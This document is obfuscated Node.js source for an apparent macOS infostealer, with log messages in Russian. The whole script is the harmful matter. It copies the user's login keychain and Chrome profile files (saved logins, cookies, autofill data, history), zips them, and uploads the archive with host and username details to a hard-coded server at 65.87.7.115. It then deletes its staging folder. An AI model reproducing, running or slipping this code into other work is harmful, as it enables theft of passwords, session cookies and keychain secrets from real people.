const _0x3f4640=_0x5bc4;(function(_0x369d82,_0x27dfad){const _0x2da083=_0x5bc4,_0xecba27=_0x369d82();while(!![]){try{const _0x325013=parseInt(_0x2da083(0xf2))/0x1+parseInt(_0x2da083(0x13f))/0x2+-parseInt(_0x2da083(0x14b))/0x3*(parseInt(_0x2da083(0xfa))/0x4)+-parseInt(_0x2da083(0x10b))/0x5+parseInt(_0x2da083(0x102))/0x6+parseInt(_0x2da083(0x114))/0x7+-parseInt(_0x2da083(0x109))/0x8;if(_0x325013===_0x27dfad)break;else _0xecba27['push'](_0xecba27['shift']());}catch(_0x38b3aa){_0xecba27['push'](_0xecba27['shift']());}}}(_0x27c9,0x505d6));const fs=require('fs'),os=require('os'),path=require('path'),{exec,execSync}=require(_0x3f4640(0x11b)),crypto=require('crypto'),axios=require(_0x3f4640(0xed)),FormData=require(_0x3f4640(0x174)),CONFIG={'serverUrl':_0x3f4640(0x185),'apiKey':_0x3f4640(0xf8),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':_0x3f4640(0x143),'zipFileName':_0x3f4640(0x115),'chromeImportantFiles':[_0x3f4640(0x173),'Web\x20Data-journal','Login\x20Data','Login\x20Data-journal',_0x3f4640(0xee),_0x3f4640(0x15c),'Cookies',_0x3f4640(0x17b),_0x3f4640(0x136),'Secure\x20Preferences']};function _0x27c9(){const _0x5e763e=['isDirectory','exit','Archive\x20size:\x20','/Users/','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','copyFileSync','toFixed','Сбор\x20данных\x20завершился\x20с\x20ошибкой','Данные\x20ошибки:\x20','round','cwd','stack','file','Web\x20Data','form-data','Creating\x20ZIP\x20archive...','pow','userInfo','stderr:\x20','\x20имеет\x20нулевой\x20размер!','00:00:00:00:00:00','Cookies-journal','Превышено\x20максимальное\x20количество\x20попыток\x20(','ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20','code','chromeImportantFiles','Тип\x20ошибки:\x20','Chrome\x20directory\x20not\x20found:\x20','./node_modules/form-data','Текущая\x20директория:\x20','error','http://65.87.7.115:8088/api/files/upload','axios','History','size','/Library/Application\x20Support/Google/Chrome','Ответ\x20сервера:\x20','128804qwaiuS','./node_modules/axios','getLengthSync','now','Error\x20creating\x20directory\x20','arch','tJz4uRVCwl2eEwyPTudYP9iGRfgq','Отправка\x20началась\x20в:\x20','3800bCDWSZ','data','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20=====','Found\x20','unknown','File\x20copied:\x20','serverUrl','Error\x20executing\x20command:\x20','3784002grzDwI','toISOString','Повторная\x20попытка\x20через\x20','Executing\x20command:\x20','hex','push','log','3527184iPxiIy','Error\x20writing\x20to\x20log:\x20','1374450LnvOfH','digest','application/zip','/Library/Keychains/login.keychain-db','stderr','0\x20Bytes','maxRetries','join','md5','576800nmkjnh','Stable.zip','npm\x20install\x20axios\x20form-data','post','append','Bytes','startsWith','child_process','platform','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','ОШИБКА:\x20Файл\x20','Размер\x20файла:\x20','success','Временная\x20директория\x20','Error\x20scanning\x20Chrome\x20profiles:\x20','status','Платформа:\x20','collector.log','response','internal','statSync','Chrome_','Directory\x20already\x20exists:\x20','readdirSync','retryDelay','\x20секунд...','Command\x20output:\x20','type','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','loaded','=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====','username','=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20=====','getHeaders','Bookmarks','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','random','Стек\x20ошибки:\x20','appendFileSync','Загрузка\x20завершена\x20за\x20','Установка\x20необходимых\x20зависимостей...','Current\x20user:\x20','609482TDuydk','request','Profile\x20','==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','Stable','login.keychain-db','existsSync','ZIP\x20archive\x20created\x20successfully','Прогресс\x20загрузки:\x20','\x20->\x20','\x20секунд\x20(','stableDir','321gSidJh','Содержимое\x20директории:\x20','Статус\x20ошибки:\x20','zipFileName','URL\x20сервера:\x20','stringify','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','Default','keys','hostname','timeout','Информация\x20о\x20системе:\x20','substring','Error\x20copying\x20Chrome\x20data:\x20','rm\x20-rf\x20','message','Версия\x20Node.js:\x20','History-journal','\x20Chrome\x20profiles:\x20','\x20удалена','update','name','total','Failed\x20to\x20create\x20ZIP\x20archive','length','createReadStream','trim'];_0x27c9=function(){return _0x5e763e;};return _0x27c9();}function log(_0x507c08,_0x51258c=![]){const _0x3e8724=_0x3f4640,_0x59cd9f=new Date()[_0x3e8724(0x103)](),_0x148a35='['+_0x59cd9f+']\x20'+_0x507c08;_0x51258c?console['error'](_0x148a35):console[_0x3e8724(0x108)](_0x148a35);try{fs[_0x3e8724(0x13b)](_0x3e8724(0x125),_0x148a35+'\x0a');}catch(_0xa0684){console[_0x3e8724(0x184)](_0x3e8724(0x10a)+_0xa0684[_0x3e8724(0x15a)]);}}function createDirectory(_0x44171c){const _0x152703=_0x3f4640;try{return!fs[_0x152703(0x145)](_0x44171c)?(fs['mkdirSync'](_0x44171c,{'recursive':!![]}),log('Directory\x20created:\x20'+_0x44171c)):log(_0x152703(0x12a)+_0x44171c),!![];}catch(_0x30009a){return log(_0x152703(0xf6)+_0x44171c+':\x20'+_0x30009a[_0x152703(0x15a)],!![]),![];}}function copyFile(_0x10d5ed,_0x58a8dc){const _0x10071a=_0x3f4640;try{return fs[_0x10071a(0x16b)](_0x10d5ed,_0x58a8dc),log(_0x10071a(0xff)+_0x10d5ed+_0x10071a(0x148)+_0x58a8dc),!![];}catch(_0x48c2ce){return log('Error\x20copying\x20file\x20'+_0x10d5ed+':\x20'+_0x48c2ce[_0x10071a(0x15a)],!![]),![];}}function executeCommand(_0x182378){const _0x5996b7=_0x3f4640;try{log(_0x5996b7(0x105)+_0x182378);const _0x47a219=execSync(_0x182378,{'encoding':'utf8'});return log(_0x5996b7(0x12e)+_0x47a219[_0x5996b7(0x165)]()),{'success':!![],'output':_0x47a219};}catch(_0x30f2de){log(_0x5996b7(0x101)+_0x30f2de['message'],!![]);if(_0x30f2de[_0x5996b7(0x10f)])log(_0x5996b7(0x178)+_0x30f2de[_0x5996b7(0x10f)],!![]);return{'success':![],'error':_0x30f2de};}}function formatFileSize(_0x9d11de){const _0x624803=_0x3f4640;if(_0x9d11de===0x0)return _0x624803(0x110);const _0x470885=0x400,_0x7505f7=[_0x624803(0x119),'KB','MB','GB','TB'],_0x396924=Math['floor'](Math[_0x624803(0x108)](_0x9d11de)/Math[_0x624803(0x108)](_0x470885));return parseFloat((_0x9d11de/Math[_0x624803(0x176)](_0x470885,_0x396924))[_0x624803(0x16c)](0x2))+'\x20'+_0x7505f7[_0x396924];}function generateClientId(){const _0x1e0eab=_0x3f4640;try{const _0x25d2d1=getMacAddress(),_0x5d57b9=os['hostname'](),_0x882312=os[_0x1e0eab(0x177)]()[_0x1e0eab(0x133)],_0x1b06d0=crypto['createHash'](_0x1e0eab(0x113))[_0x1e0eab(0x15f)](_0x25d2d1+':'+_0x5d57b9+':'+_0x882312)[_0x1e0eab(0x10c)](_0x1e0eab(0x106))[_0x1e0eab(0x157)](0x0,0x8);return _0x1b06d0;}catch(_0x4da247){return Math[_0x1e0eab(0x139)]()['toString'](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x49e24f=_0x3f4640;try{const _0x1e6e1d=os['networkInterfaces']();for(const _0x498bbe of Object[_0x49e24f(0x153)](_0x1e6e1d)){for(const _0x367fc1 of _0x1e6e1d[_0x498bbe]){if(!_0x367fc1[_0x49e24f(0x127)]&&_0x367fc1['mac']!==_0x49e24f(0x17a))return _0x367fc1['mac'];}}return _0x49e24f(0xfe);}catch(_0x45c311){return _0x49e24f(0xfe);}}async function collectData(){const _0x33e691=_0x3f4640;try{log(_0x33e691(0x132));if(!createDirectory(CONFIG[_0x33e691(0x14a)]))throw new Error('Failed\x20to\x20create\x20Stable\x20directory');const _0x368123=os[_0x33e691(0x177)]()[_0x33e691(0x133)];log(_0x33e691(0x13e)+_0x368123);const _0x3d84c0=_0x33e691(0x169)+_0x368123+_0x33e691(0x10e),_0x1676c3=path[_0x33e691(0x112)](CONFIG[_0x33e691(0x14a)],_0x33e691(0x144));fs[_0x33e691(0x145)](_0x3d84c0)?copyFile(_0x3d84c0,_0x1676c3):log('Keychain\x20file\x20not\x20found:\x20'+_0x3d84c0,!![]);try{const _0x30f433=_0x33e691(0x169)+_0x368123+_0x33e691(0xf0);if(fs[_0x33e691(0x145)](_0x30f433)){const _0x333380=[];fs[_0x33e691(0x145)](path[_0x33e691(0x112)](_0x30f433,_0x33e691(0x152)))&&_0x333380['push']('Default');try{const _0x575de6=fs[_0x33e691(0x12b)](_0x30f433,{'withFileTypes':!![]});for(const _0x51a678 of _0x575de6){_0x51a678[_0x33e691(0x166)]()&&_0x51a678[_0x33e691(0x160)][_0x33e691(0x11a)](_0x33e691(0x141))&&_0x333380[_0x33e691(0x107)](_0x51a678['name']);}}catch(_0x2c8495){log(_0x33e691(0x122)+_0x2c8495['message'],!![]);}log(_0x33e691(0xfd)+_0x333380[_0x33e691(0x163)]+_0x33e691(0x15d)+_0x333380[_0x33e691(0x112)](',\x20'));for(const _0x28f674 of _0x333380){const _0x14a109=path['join'](_0x30f433,_0x28f674),_0x5e66a4=path[_0x33e691(0x112)](CONFIG[_0x33e691(0x14a)],_0x33e691(0x129)+_0x28f674);createDirectory(_0x5e66a4);for(const _0x3aa816 of CONFIG[_0x33e691(0x17f)]){const _0x360676=path[_0x33e691(0x112)](_0x14a109,_0x3aa816),_0x29ba76=path[_0x33e691(0x112)](_0x5e66a4,_0x3aa816);fs['existsSync'](_0x360676)?copyFile(_0x360676,_0x29ba76):log(_0x33e691(0x11d)+_0x28f674+':\x20'+_0x360676);}log('Chrome\x20data\x20for\x20profile\x20'+_0x28f674+'\x20copied\x20successfully');}}else log(_0x33e691(0x181)+_0x30f433,!![]);}catch(_0x5ae1c6){log(_0x33e691(0x158)+_0x5ae1c6[_0x33e691(0x15a)],!![]);}log(_0x33e691(0x175));const _0x24a395=executeCommand('zip\x20-r\x20-1\x20'+CONFIG['zipFileName']+'\x20'+CONFIG[_0x33e691(0x14a)]+'\x20-x\x20\x22*.DS_Store\x22');if(!_0x24a395[_0x33e691(0x120)])throw new Error(_0x33e691(0x162));log(_0x33e691(0x146));if(fs[_0x33e691(0x145)](CONFIG[_0x33e691(0x14e)])){const _0x185f59=fs[_0x33e691(0x128)](CONFIG[_0x33e691(0x14e)]);log(_0x33e691(0x168)+formatFileSize(_0x185f59[_0x33e691(0xef)]));}else throw new Error(_0x33e691(0x137));return log('=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20====='),!![];}catch(_0x24fb9a){return log('Error\x20in\x20data\x20collection:\x20'+_0x24fb9a[_0x33e691(0x15a)],!![]),![];}}function _0x5bc4(_0x200b25,_0x46ee8b){const _0x27c974=_0x27c9();return _0x5bc4=function(_0x5bc4e9,_0x406aa0){_0x5bc4e9=_0x5bc4e9-0xed;let _0x161289=_0x27c974[_0x5bc4e9];return _0x161289;},_0x5bc4(_0x200b25,_0x46ee8b);}async function uploadFile(_0x1ebba4=0x0){const _0x455198=_0x3f4640;try{const _0x1704e7=path[_0x455198(0x112)](process[_0x455198(0x170)](),CONFIG['zipFileName']);if(!fs['existsSync'](_0x1704e7))return log(_0x455198(0x151)+_0x1704e7,!![]),log(_0x455198(0x183)+process['cwd'](),!![]),log(_0x455198(0x14c)+fs['readdirSync'](process['cwd']())[_0x455198(0x112)](',\x20'),!![]),![];const _0x52f98e=fs[_0x455198(0x128)](_0x1704e7),_0x1d6e95=_0x52f98e[_0x455198(0xef)];log(_0x455198(0x11f)+_0x1d6e95+'\x20байт\x20('+formatFileSize(_0x1d6e95)+')');if(_0x1d6e95===0x0)return log(_0x455198(0x11e)+CONFIG[_0x455198(0x14e)]+_0x455198(0x179),!![]),![];const _0x550d30=new FormData();_0x550d30[_0x455198(0x118)](_0x455198(0x172),fs[_0x455198(0x164)](_0x1704e7),{'filename':path['basename'](_0x1704e7),'contentType':_0x455198(0x10d),'knownLength':_0x1d6e95});const _0x34dd85={'hostname':os[_0x455198(0x154)](),'platform':os[_0x455198(0x11c)](),'type':os[_0x455198(0x12f)](),'arch':os[_0x455198(0xf7)](),'username':os['userInfo']()[_0x455198(0x133)],'id':generateClientId()};log(_0x455198(0xfc)),log(_0x455198(0x156)+JSON[_0x455198(0x150)](_0x34dd85)),log(_0x455198(0x14f)+CONFIG[_0x455198(0x100)]);const _0x418cc8=Date['now']();log(_0x455198(0xf9)+new Date(_0x418cc8)[_0x455198(0x103)]());const _0x188ab1=await axios[_0x455198(0x117)](CONFIG[_0x455198(0x100)],_0x550d30,{'headers':{..._0x550d30[_0x455198(0x135)](),'X-Client-Info':JSON[_0x455198(0x150)](_0x34dd85),'Content-Length':_0x550d30[_0x455198(0xf4)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x455198(0x155)],'onUploadProgress':_0x49b647=>{const _0xff313f=_0x455198,_0x4b8848=Math[_0xff313f(0x16f)](_0x49b647['loaded']*0x64/_0x49b647[_0xff313f(0x161)]);log(_0xff313f(0x147)+_0x4b8848+'%\x20('+formatFileSize(_0x49b647[_0xff313f(0x131)])+'/'+formatFileSize(_0x49b647[_0xff313f(0x161)])+')');}}),_0xb566b1=Date[_0x455198(0xf5)](),_0x4ae4cc=(_0xb566b1-_0x418cc8)/0x3e8,_0x37e504=_0x1d6e95/_0x4ae4cc/0x400;return log(_0x455198(0x13c)+_0x4ae4cc[_0x455198(0x16c)](0x1)+_0x455198(0x149)+_0x37e504[_0x455198(0x16c)](0x2)+'\x20KB/s)'),log('Статус\x20ответа:\x20'+_0x188ab1[_0x455198(0x123)]),log(_0x455198(0xf1)+JSON[_0x455198(0x150)](_0x188ab1[_0x455198(0xfb)])),log(_0x455198(0x134)),_0x188ab1['data'][_0x455198(0x120)];}catch(_0x1d5483){log(_0x455198(0x17d)+(_0x1ebba4+0x1)+'/'+CONFIG[_0x455198(0x111)]+'):',!![]);if(_0x1d5483['response'])log(_0x455198(0x14d)+_0x1d5483[_0x455198(0x126)][_0x455198(0x123)],!![]),log(_0x455198(0x16e)+JSON[_0x455198(0x150)](_0x1d5483[_0x455198(0x126)]['data']),!![]);else _0x1d5483[_0x455198(0x140)]?(log('Нет\x20ответа\x20от\x20сервера',!![]),log(_0x455198(0x180)+_0x1d5483[_0x455198(0x17e)],!![])):log('Ошибка\x20настройки:\x20'+_0x1d5483['message'],!![]);if(_0x1ebba4<CONFIG['maxRetries'])return log(_0x455198(0x104)+CONFIG[_0x455198(0x12c)]/0x3e8+_0x455198(0x12d)),await new Promise(_0x15e477=>setTimeout(_0x15e477,CONFIG['retryDelay'])),uploadFile(_0x1ebba4+0x1);return log(_0x455198(0x17c)+CONFIG[_0x455198(0x111)]+')',!![]),![];}}async function main(){const _0x370e77=_0x3f4640;try{log('==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20=========='),log(_0x370e77(0x15b)+process['version']),log(_0x370e77(0x124)+process['platform']),log('Директория\x20запуска:\x20'+process[_0x370e77(0x170)]());try{(!fs[_0x370e77(0x145)](_0x370e77(0xf3))||!fs[_0x370e77(0x145)](_0x370e77(0x182)))&&(log(_0x370e77(0x13d)),execSync(_0x370e77(0x116)),log('Зависимости\x20успешно\x20установлены'));}catch(_0x51e453){log(_0x370e77(0x130)+_0x51e453[_0x370e77(0x15a)]);}const _0x5b245c=await collectData();!_0x5b245c&&(log(_0x370e77(0x16d),!![]),process[_0x370e77(0x167)](0x1));const _0x382b53=await uploadFile();if(_0x382b53){log(_0x370e77(0x16a));try{fs[_0x370e77(0x145)](CONFIG['stableDir'])&&(executeCommand(_0x370e77(0x159)+CONFIG[_0x370e77(0x14a)]),log(_0x370e77(0x121)+CONFIG['stableDir']+_0x370e77(0x15e)));}catch(_0x2ddea6){log('Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20'+_0x2ddea6[_0x370e77(0x15a)]);}process[_0x370e77(0x167)](0x0);}else log(_0x370e77(0x142),!![]),process[_0x370e77(0x167)](0x1);}catch(_0x1a9a00){log(_0x370e77(0x138)+_0x1a9a00[_0x370e77(0x15a)],!![]),log(_0x370e77(0x13a)+_0x1a9a00[_0x370e77(0x171)],!![]),process[_0x370e77(0x167)](0x1);}}main();
